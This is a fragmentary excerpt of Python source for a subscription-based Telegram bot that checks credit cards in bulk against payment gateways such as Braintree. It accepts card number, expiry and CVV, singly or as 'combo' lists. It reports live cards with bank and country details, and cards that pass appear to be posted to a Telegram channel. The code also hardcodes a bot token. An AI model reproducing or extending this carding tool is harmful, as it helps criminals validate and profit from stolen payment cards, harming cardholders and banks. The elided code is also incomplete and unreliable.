...
import threading
stopuser = {}
token = '7400498506:AAG3Id_e3iMFl0vEVJp0i6ja-jV6lRgaLMg'
	...
	def my_function():
	  ...
	  "timer": "none",
		...
		if BL == '𝗙𝗥𝗘𝗘':	
			...
			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/NB_Luis")
			contact_button = types.InlineKeyboardButton(text="𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/darkxbins")
			keyboard.add(contact_button, ahmed)
			video_url = f'https://t.me/okchkvdo/16'
			bot.send_video(chat_id=message.chat.id, video=video_url, caption=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗗𝗔𝗬 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝗕𝗢𝗧 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦
...
𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/NB_Luis")
		ahmed = types.InlineKeyboardButton(text="𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/darkxbins")
		keyboard.add(contact_button, ahmed)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		video_url = f'https://t.me/okchkvdo/16'
		bot.send_video(chat_id=message.chat.id, video=video_url, caption='''𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗬𝗢𝗨𝗥 𝗕𝗢𝗧 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 ❤\n\n𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦''',reply_markup=keyboard)
...
def start(message):
	...
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text="𝗕𝗢𝗧 𝗨𝗣𝗗𝗔𝗧𝗘", url="https://t.me/darkxbins")
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> 
𝗧𝗛𝗘𝗦𝗘 𝗔𝗥𝗘 𝗧𝗛𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟'𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 
━━━━━━━━━━━━
𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 ➜ <code>/𝗰𝗵𝗸 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃</code>
𝗦𝗧𝗔𝗧𝗨𝗦 : ✅
━━━━━━━━━━━━
𝟯𝗗 𝗟𝗢𝗢𝗞𝗨𝗣 ➜ <code>/𝘃𝗯𝘃 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃</code>
𝗦𝗧𝗔𝗧𝗨𝗦 : ❌
━━━━━━━━━━━━
𝗠𝗔𝗦𝗦 𝗔𝗨𝗧𝗛 ➜ <code>𝗦𝗘𝗡𝗗 𝗖𝗖 𝗖𝗢𝗠𝗕𝗢 𝗠𝗔𝗫 𝟮𝟬𝟬</code>
𝗦𝗧𝗔𝗧𝗨𝗦 : ✅
━━━━━━━━━━━━
𝗪𝗘 𝗪𝗜𝗟𝗟 𝗕𝗘 𝗔𝗗𝗗𝗜𝗡𝗚 𝗦𝗢𝗠𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬𝗦 𝗦𝗢𝗢𝗡</b>
''',reply_markup=keyboard)
...
''',reply_markup=keyboard)
		...
		if current_time - provided_time > required_duration:
			...
			contact_button = types.InlineKeyboardButton(text="𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/darkxbins")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝗕𝗢𝗧 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗\n- /𝘀𝘁𝗮𝗿𝘁 𝗔𝗡𝗗 𝗦𝗘𝗘 𝗕𝗢𝗧 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
		...
		keyboard.add(contact_button)
		keyboard.add(sw)
		bot.reply_to(message, text=f'𝗖𝗛𝗢𝗢𝗦𝗘 𝗧𝗛𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘\n𝗖𝗵𝗼𝗼𝘀𝗲 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗦𝘁𝗿𝗶𝗽𝗲 𝗚𝗮𝘁𝗲 𝗗𝗲𝗮𝗱',reply_markup=keyboard)
...
def menu_callback(call):
	def my_function():
		...
		ch = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛")
		try:
			with open("combo.txt", 'r') as file:
				...
				for cc in lino:
					...
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  ...
					  text=f'''𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧 𝗪𝗛𝗜𝗟𝗘 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦 𝗔𝗥𝗘 𝗕𝗘𝗜𝗡𝗚 𝗖𝗛𝗘𝗖𝗞 𝗔𝗧 𝗧𝗛𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 {gate} 𝗕𝗢𝗧 𝗕𝗬 ➜ @NB_Luis''', reply_markup=mes)
...
𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➜ {last}
𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ {gate}		
𝗕𝗜𝗡 𝗜𝗡𝗙𝗢 ➜ {cc[:6]} - {card_type} - {brand}- {level}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➜ {country} - {country_flag} 
𝗜𝗦𝗦𝗨𝗘𝗥 ➜ {bank}
𝗧𝗜𝗠𝗘 ➜ {"{:.1f}".format(execution_time)}
𝗕𝗢𝗧 𝗕𝗬 ➜ @NB_Luis</b>'''
					msgc=f'''<b>𝗖𝗖𝗡 ❎
...
𝗕𝗢𝗧 𝗕𝗬 ➜ @NB_Luis</b>'''
					if 'success' in last:
						tok = '7400498506:AAG3Id_e3iMFl0vEVJp0i6ja-jV6lRgaLMg'
						acc =  '-1002237348547'
						mg = f"""<b> 
❆═══𝙵𝙻𝙴𝚇 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
		...
		try:
			with open("combo.txt", 'r') as file:
				...
				for cc in lino:
					...
					ccn = types.InlineKeyboardButton(f"• 𝗖𝗖𝗡 ❎ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝗥𝗜𝗦𝗞 🪐 ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 ⚡ ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
...
def respond_to_vbv(message):
  ...
  "timer": "none",
	...
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="@NB_Luis")
		ahmed = types.InlineKeyboardButton(text="𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/darkxbins")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
...
def respond_to_vbv(message):
	def my_function():
		...
		try:
			...
			msg=f'''<b>𝗗𝗢𝗡𝗘 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅
𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}
𝗧𝗬𝗣𝗘 ➜ {typ}
𝗧𝗬𝗣𝗘 /cmds 𝗙𝗢𝗥 𝗕𝗢𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗</b>'''
...
def start(message):
	def my_function():
		...
		try:
			...
			pas ='LUIS-'+''.join(random.choices(characters, k=3))+'-'+''.join(random.choices(characters, k=2))+'-'+''.join(random.choices(characters, k=2))
			current_time = datetime.now()
...
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
	...
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.ddd') or message.text.lower().startswith('/ddd'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3D Lookup'
...
ꪜ  𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
ꪜ  𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
ꪜ  𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
ꪜ  𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
ꪜ  𝑩𝒀: @NB_Luis
ꪜ  𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
ꪜ  𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
ꪜ  𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
